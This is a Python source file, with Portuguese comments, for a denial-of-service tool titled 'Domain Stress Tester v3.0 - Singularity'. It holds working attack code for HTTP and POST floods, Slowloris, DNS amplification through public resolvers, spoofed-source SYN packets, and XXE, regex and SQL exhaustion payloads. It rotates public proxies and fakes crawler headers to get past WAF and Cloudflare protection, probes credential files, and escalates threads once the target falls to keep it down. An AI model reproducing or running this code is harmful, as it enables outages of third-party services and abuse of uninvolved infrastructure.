#!/usr/bin/env python3
# ================================================================
# DOMAIN STRESS TESTER v3.0 - MODO SINGULARITY
# ATAQUE DE EXAUSTÃO TOTAL - APENAS PARA TESTES AUTORIZADOS
# ================================================================

import concurrent.futures
import random
import socket
import ssl
import threading
import time
import hashlib
import struct
import ipaddress
import json
import gzip
import zlib
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, quote, urlencode
import os
import sys

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from scapy.all import IP, ICMP, sr1, Ether, ARP, Raw  # type: ignore
except ImportError:
    IP, ICMP, sr1, Ether, ARP, Raw = None, None, None, None, None, None

try:
    import aiohttp
    import aiohttp.client_exceptions
    import asyncio
except ImportError:
    aiohttp = None
    aiohttp.client_exceptions = None
    asyncio = None

from utils.logger import get_module_logger

logger = get_module_logger("stress_tester_singularity")

# ================================================================
# CONFIGURAÇÕES DE ATAQUE MASSIVO
# ================================================================

# Bypass de Cloudflare e WAF
BYPASS_HEADERS = {
    "User-Agent": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/115.0 Firefox/115.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    ],
    "Accept": [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    ],
    "Accept-Encoding": ["gzip, deflate, br", "gzip, deflate", "br, gzip"],
    "Accept-Language": ["en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"],
    "Connection": ["keep-alive", "close"],
    "Cache-Control": ["no-cache", "max-age=0"],
}

# Lista de User-Agents para rotação
USER_AGENTS = BYPASS_HEADERS["User-Agent"]

# Proxies públicos (para rotação e distribuição)
PROXY_LIST = [
    "http://47.91.84.174:8080",
    "http://103.152.112.120:80",
    "http://103.236.201.58:8080",
    "http://103.70.153.135:8080",
    "http://103.121.90.130:8080",
    "http://103.216.82.194:8080",
    "http://103.230.252.236:8080",
    "http://103.226.214.162:8080",
    "http://103.242.32.138:8080",
    "socks5://154.16.140.58:1080",
    "socks5://47.91.84.174:1080",
    "socks5://103.152.112.120:1080",
]

# Servidores de amplificação (DNS, NTP, Memcached, etc.)
AMPLIFICATION_SERVERS = {
    "dns": ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26"],
    "ntp": ["pool.ntp.org", "time.google.com", "time.windows.com"],
    "memcached": [],  # Memcached amplification (portas 11211)
}

# Payloads de exaustão de recursos
EXHAUSTION_PAYLOADS = [
    # Payloads que consomem CPU (hash)
    lambda: f"hash={hashlib.md5(str(random.randint(1, 9999999)).encode()).hexdigest()}" * 100,
    # Payloads que consomem memória (JSON grande)
    lambda: json.dumps({"data": "X" * random.randint(10000, 100000)}),
    # Payloads que consomem banda (compressão)
    lambda: "A" * random.randint(10000, 100000),
    # Payloads de entidades XML (XXE)
    lambda: f"""<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///dev/random">
]>
<root>&test;</root>""",
    # Payloads SQL (exaustão de BD)
    lambda: "SELECT * FROM users WHERE id = " + str(random.randint(1, 9999999)) + " OR 1=1;",
]

# ================================================================
# STATS COLLECTOR (OTIMIZADO)
# ================================================================

class SingularityStatsCollector:
    """Coletor de estatísticas com análise de alvo"""

    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.success = 0
        self.fail = 0
        self.start_time = None
        self.end_time = None
        self.by_method = {}
        self.target_history = []
        self._last_rps_sample = 0
        self._last_rps_time = time.time()

    def start(self):
        self.start_time = time.time()

    def stop(self):
        self.end_time = time.time()

    def add_request(self, success: bool, method: str = "http", error: str = None):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.fail += 1

            if method not in self.by_method:
                self.by_method[method] = {"ok": 0, "fail": 0}
            if success:
                self.by_method[method]["ok"] += 1
            else:
                self.by_method[method]["fail"] += 1

    def add_target_status(self, is_up: bool):
        with self.lock:
            self.target_history.append((time.time(), is_up))
            if len(self.target_history) > 1000:
                self.target_history = self.target_history[-1000:]

    def get_rps(self) -> float:
        if self.start_time is None:
            return 0.0
        elapsed = time.time() - self.start_time
        return self.total / elapsed if elapsed > 0 else 0.0

    def get_success_rate(self) -> float:
        return (self.success / self.total * 100) if self.total > 0 else 0.0

    def get_duration(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    def get_current_uptime(self, window: int = 5) -> float:
        """Calcula uptime nos últimos 'window' segundos"""
        if not self.target_history:
            return 100.0
        now = time.time()
        recent = [(t, s) for t, s in self.target_history if now - t <= window]
        if not recent:
            return 100.0
        up = sum(1 for _, s in recent if s)
        return (up / len(recent)) * 100

    def is_target_down(self) -> bool:
        """Verifica se o alvo está derrubado"""
        return self.get_current_uptime(5) < 10.0

    def get_summary(self) -> Dict:
        return {
            "total": self.total,
            "success": self.success,
            "fail": self.fail,
            "success_rate": round(self.get_success_rate(), 2),
            "avg_rps": round(self.get_rps(), 2),
            "duration": round(self.get_duration(), 2),
            "uptime": round(self.get_current_uptime(5), 2),
            "is_down": self.is_target_down(),
            "by_method": self.by_method,
        }


# ================================================================
# ENGINES DE EXAUSTÃO TOTAL
# ================================================================

class SingularityStressEngine:
    """Engine de ataque de exaustão total"""

    def __init__(self, target: str, threads: int, duration: int, proxies: List[str] = None):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = SingularityStatsCollector()
        self.proxies = proxies or []
        self.parsed = urlparse(target if target.startswith("http") else f"http://{target}")
        self.host = self.parsed.netloc.split(":")[0]
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.scheme = self.parsed.scheme or "http"
        self.base_url = f"{self.scheme}://{self.host}"
        self.proxy_index = 0
        self.session = self._create_session()

        # Configura ataques
        self.attack_modes = [
            self._http_flood,
            self._https_flood,
            self._post_flood,
            self._slowloris_attack,
            self._dns_amplification,
            self._syn_flood,
            self._http_pipeline,
            self._exhaustion_attack,
            self._websocket_attack,
        ]

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        # Configura pool para alta concorrência
        adapter = HTTPAdapter(
            pool_connections=200,
            pool_maxsize=200,
            max_retries=Retry(total=0)
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _random_headers(self) -> Dict:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(BYPASS_HEADERS["Accept"]),
            "Accept-Encoding": random.choice(BYPASS_HEADERS["Accept-Encoding"]),
            "Accept-Language": random.choice(BYPASS_HEADERS["Accept-Language"]),
            "Connection": random.choice(BYPASS_HEADERS["Connection"]),
            "Cache-Control": random.choice(BYPASS_HEADERS["Cache-Control"]),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Referer": self.base_url + "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 15))),
            "Origin": self.base_url,
        }

    def _get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return self.proxies[self.proxy_index]

    def _check_target_up(self, timeout: float = 2.0) -> bool:
        try:
            url = f"{self.base_url}/"
            response = self.session.get(url, timeout=timeout, headers=self._random_headers())
            return response.status_code < 500
        except Exception:
            return False

    def run(self) -> SingularityStatsCollector:
        self.stats.start()
        self.running = True

        # Status inicial
        initial_up = self._check_target_up()
        self.stats.add_target_status(initial_up)
        logger.info(f"[*] Alvo: {self.target} - Status inicial: {'🟢 UP' if initial_up else '🔴 DOWN'}")

        # Ataque massivo
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads * 2) as executor:
            # Workers de ataque
            workers = [executor.submit(self._worker, i) for i in range(self.threads)]

            # Monitor de status
            monitor = executor.submit(self._monitor_target)

            # Executa até o tempo acabar ou o alvo cair
            start_time = time.time()
            while self.running:
                elapsed = time.time() - start_time

                # Se o alvo está down, mantém pressão
                if self.stats.is_target_down():
                    logger.info(f"[!] Alvo DERRUBADO! Mantendo pressão... ({elapsed:.1f}s)")
                    # Aumenta threads para evitar recuperação
                    self.threads = min(self.threads + 50, 1000)
                else:
                    # Verifica se já passou do tempo
                    if elapsed > self.duration and not self.stats.is_target_down():
                        logger.info(f"[*] Tempo esgotado. Alvo ainda UP.")
                        break

                # Limite máximo de segurança
                if elapsed > self.duration * 3:
                    break

                time.sleep(0.5)

            self.running = False
            self.stats.stop()

            concurrent.futures.wait(workers, timeout=10)
            monitor.cancel()

        return self.stats

    def _monitor_target(self):
        """Monitora status do alvo"""
        while self.running:
            is_up = self._check_target_up()
            self.stats.add_target_status(is_up)
            time.sleep(1)

    def _worker(self, worker_id: int):
        """Worker de ataque"""
        while self.running:
            try:
                mode = random.choice(self.attack_modes)
                mode()
            except Exception as e:
                self.stats.add_request(False, "error", str(e)[:50])

    # ========== MÉTODOS DE ATAQUE ==========

    def _http_flood(self):
        """Flood HTTP massivo"""
        try:
            paths = [
                "/", "/index.html", "/login", "/api", "/health", "/ping",
                "/static/css/main.css", "/static/js/main.js", "/images/logo.png",
                "/wp-admin", "/admin", "/cgi-bin", "/.env", "/config.php",
                "/backup.sql", "/.git/config", "/.aws/credentials"
            ]
            path = random.choice(paths)
            url = f"{self.base_url}{path}"
            headers = self._random_headers()
            proxy = self._get_proxy()

            # Ataque com método aleatório
            method = random.choice(["GET", "HEAD", "OPTIONS"])
            if method == "GET":
                response = self.session.get(url, headers=headers, timeout=2, proxies={"http": proxy, "https": proxy} if proxy else None)
            elif method == "HEAD":
                response = self.session.head(url, headers=headers, timeout=2, proxies={"http": proxy, "https": proxy} if proxy else None)
            else:
                response = self.session.options(url, headers=headers, timeout=2, proxies={"http": proxy, "https": proxy} if proxy else None)

            self.stats.add_request(response.status_code < 500, "http")
        except Exception as e:
            self.stats.add_request(False, "http", str(e)[:30])

    def _https_flood(self):
        """Flood HTTPS com reconexão TLS"""
        try:
            if self.scheme != "https" and self.port != 443:
                self._http_flood()
                return

            # Usa socket para TLS flood
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.host, self.port))
            ssl_sock = context.wrap_socket(sock, server_hostname=self.host)

            # Requisição com corpo grande
            body = "A" * random.randint(1000, 5000)
            request = f"""GET /{random.randint(1, 999999)} HTTP/1.1
Host: {self.host}
User-Agent: {random.choice(USER_AGENTS)}
Accept: */*
Connection: close

{body}"""
            ssl_sock.send(request.encode())
            try:
                ssl_sock.recv(1024)
            except:
                pass
            ssl_sock.close()
            self.stats.add_request(True, "https")
        except Exception as e:
            self.stats.add_request(False, "https", str(e)[:30])

    def _post_flood(self):
        """Flood POST com dados pesados"""
        try:
            path = random.choice(["/login", "/api/v1/auth", "/submit", "/upload", "/form", "/graphql"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"

            # Dados de exaustão
            if random.random() < 0.3:
                # Payload de exaustão de CPU
                data = {
                    "hash": hashlib.sha256(str(random.randint(1, 999999999)).encode()).hexdigest() * 50,
                    "data": "X" * random.randint(1000, 10000),
                }
            else:
                data = {
                    "username": "admin" + str(random.randint(1, 999999)),
                    "password": "pass" + str(random.randint(1, 999999)),
                    "email": f"user{random.randint(1, 999999)}@example.com",
                    "csrf_token": hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest(),
                    "data": json.dumps({"key": "X" * random.randint(100, 1000)}),
                }

            proxy = self._get_proxy()
            response = self.session.post(
                url,
                data=data,
                headers=headers,
                timeout=3,
                proxies={"http": proxy, "https": proxy} if proxy else None
            )
            self.stats.add_request(response.status_code < 500, "post")
        except Exception as e:
            self.stats.add_request(False, "post", str(e)[:30])

    def _slowloris_attack(self):
        """Slowloris aprimorado"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))

            # Headers parciais
            headers = [
                f"GET /{random.randint(1, 999999)} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {random.choice(USER_AGENTS)}",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9",
                "Accept-Language: en-US,en;q=0.9",
                "Cache-Control: no-cache",
                "Connection: keep-alive",
                "X-Client-Id: " + hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest(),
            ]

            # Envia headers lentamente
            for header in headers:
                sock.send(header.encode() + b"\r\n")
                time.sleep(random.uniform(0.3, 1.5))

            # Mantém conexão viva
            for _ in range(20):
                if not self.running:
                    break
                sock.send(b"X-Data: " + b"A" * random.randint(100, 500) + b"\r\n")
                time.sleep(random.uniform(2, 5))

            sock.close()
            self.stats.add_request(True, "slowloris")
        except Exception as e:
            self.stats.add_request(False, "slowloris", str(e)[:30])

    def _dns_amplification(self):
        """Amplificação DNS (TXT e ANY)"""
        try:
            server = random.choice(AMPLIFICATION_SERVERS["dns"])
            domain = f"{random.randint(1, 9999999)}.{random.randint(1, 999999)}.{self.target}"

            # Query TXT para amplificação máxima
            header = bytearray(12)
            header[0:2] = b'\xAA\xAA'
            header[2:4] = b'\x01\x00'
            header[4:6] = b'\x00\x01'

            qname = b""
            for part in domain.split("."):
                qname += bytes([len(part)]) + part.encode()
            qname += b"\x00"

            # Tipo ANY (255) ou TXT (16) para maior resposta
            qtype = b"\x00\xFF"  # ANY
            qclass = b"\x00\x01"

            query = bytes(header) + qname + qtype + qclass

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(query, (server, 53))
            sock.close()
            self.stats.add_request(True, "dns")
        except Exception as e:
            self.stats.add_request(False, "dns", str(e)[:30])

    def _syn_flood(self):
        """SYN Flood com sockets RAW"""
        try:
            # Usa socket RAW se disponível (Linux/Unix)
            if sys.platform != "win32":
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                    # Constrói pacote SYN
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    src_port = random.randint(1024, 65535)

                    # Cabeçalho IP
                    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(self.host))

                    # Cabeçalho TCP
                    tcp_header = struct.pack('!HHLLBBHHH', src_port, self.port, 0, 0, 80, 0, 0, 0, 0)

                    packet = ip_header + tcp_header
                    sock.sendto(packet, (self.host, self.port))
                    sock.close()
                    self.stats.add_request(True, "syn")
                    return
                except:
                    pass

            # Fallback: conexão normal
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((self.host, self.port))
            sock.close()
            self.stats.add_request(True, "syn")
        except Exception as e:
            self.stats.add_request(False, "syn", str(e)[:30])

    def _http_pipeline(self):
        """HTTP Pipelining massivo"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.host, self.port))

            # 20 requisições em pipeline
            req_template = f"GET /{random.randint(1, 999999)} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: keep-alive\r\n\r\n"
            requests_batch = req_template * 20

            sock.send(requests_batch.encode())
            # Leitura mínima
            for _ in range(5):
                try:
                    sock.recv(1024)
                except:
                    break
            sock.close()
            self.stats.add_request(True, "pipeline")
        except Exception as e:
            self.stats.add_request(False, "pipeline", str(e)[:30])

    def _exhaustion_attack(self):
        """Ataque de exaustão de recursos do servidor"""
        try:
            path = random.choice(["/api/search", "/api/query", "/graphql", "/search", "/filter"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers()
            headers["Content-Type"] = "application/json"

            # Payloads de exaustão
            payload_choices = [
                # JSON profundo (exaustão de parser)
                json.dumps({"data": {"nested": [{"value": "X" * 1000} for _ in range(100)]}}),
                # Regex exaustivo
                f'{{"search": "{ "a" * 1000 }", "regex": "^(a+)$"}}',
                # XML com entidades
                f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///dev/random">]><root>&x;</root>',
                # SQL exaustivo
                f'{{"query": "SELECT * FROM users WHERE id IN ({",".join([str(random.randint(1, 999999)) for _ in range(100)])})"}}',
            ]

            data = random.choice(payload_choices)
            proxy = self._get_proxy()
            response = self.session.post(
                url,
                data=data,
                headers=headers,
                timeout=3,
                proxies={"http": proxy, "https": proxy} if proxy else None
            )
            self.stats.add_request(response.status_code < 500, "exhaustion")
        except Exception as e:
            self.stats.add_request(False, "exhaustion", str(e)[:30])

    def _websocket_attack(self):
        """Ataque a WebSocket (simulado)"""
        try:
            # Tenta conectar via WebSocket se houver endpoint
            ws_url = f"ws://{self.host}/ws" if self.scheme == "http" else f"wss://{self.host}/ws"
            # Simula com HTTP normal se não der
            self._http_flood()
        except:
            self._http_flood()


# ================================================================
# FACTORY E FUNÇÃO PRINCIPAL
# ================================================================

def create_engine(target: str, threads: int, duration: int, proxies: List[str] = None) -> SingularityStressEngine:
    return SingularityStressEngine(target, threads, duration, proxies)


def run_stress(target: str, threads: int = 300, duration: int = 60, proxies: List[str] = None) -> Dict:
    """Executa ataque de exaustão total"""

    logger.info(f"[*] Iniciando ataque SINGULARITY em: {target}")
    logger.info(f"[*] Threads: {threads} | Duração: {duration}s")

    engine = create_engine(target, threads, duration, proxies)
    stats = engine.run()
    summary = stats.get_summary()

    report = f"""
═══════════════════════════════════════════
  DOMAIN STRESS TEST v3.0 - SINGULARITY
═══════════════════════════════════════════
  Target: {target}
  Threads: {threads}
  Duration: {summary['duration']:.1f}s
  Status: {'🔴 DERRUBADO' if summary['is_down'] else '🟢 ATIVO'}
═══════════════════════════════════════════

▸ STATISTICS
  Total Requests: {summary['total']:,}
  Successful: {summary['success']:,} ({summary['success_rate']:.1f}%)
  Failed: {summary['fail']:,} ({100 - summary['success_rate']:.1f}%)
  Avg RPS: {summary['avg_rps']:.2f}
  Uptime: {summary['uptime']:.1f}%

▸ BY ATTACK METHOD
"""
    for method, data in summary.get('by_method', {}).items():
        total = data['ok'] + data['fail']
        if total > 0:
            rate = (data['ok'] / total) * 100
            report += f"  {method.upper()}: {total:,} reqs ({rate:.1f}% ok)\n"

    report += f"""
═══════════════════════════════════════════
  {'✅ ALVO DERRUBADO' if summary['is_down'] else '❌ ALVO RESISTIU'}
═══════════════════════════════════════════
"""

    return {
        "target": target,
        "threads": threads,
        "duration": duration,
        "is_down": summary['is_down'],
        "uptime": summary['uptime'],
        "stats": summary,
        "report": report,
    }


def run(config: Dict = None) -> Dict:
    if config is None:
        config = {}

    target = config.get("target", "")
    if not target:
        raise ValueError("Target is required")

    threads = config.get("threads", 300)
    duration = config.get("duration", 60)
    proxies = config.get("proxies", PROXY_LIST[:10])

    return run_stress(target, threads, duration, proxies)


# ================================================================
# CLI
# ================================================================

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Domain Stress Tester v3.0 - Singularity")
    parser.add_argument("--target", required=True, help="Target domain or IP")
    parser.add_argument("--threads", type=int, default=300, help="Number of threads (default: 300)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (default: 60)")
    parser.add_argument("--proxies", help="Comma-separated list of proxies")

    args = parser.parse_args()
    proxies = args.proxies.split(",") if args.proxies else None

    result = run_stress(args.target, args.threads, args.duration, proxies)
    print(result["report"])
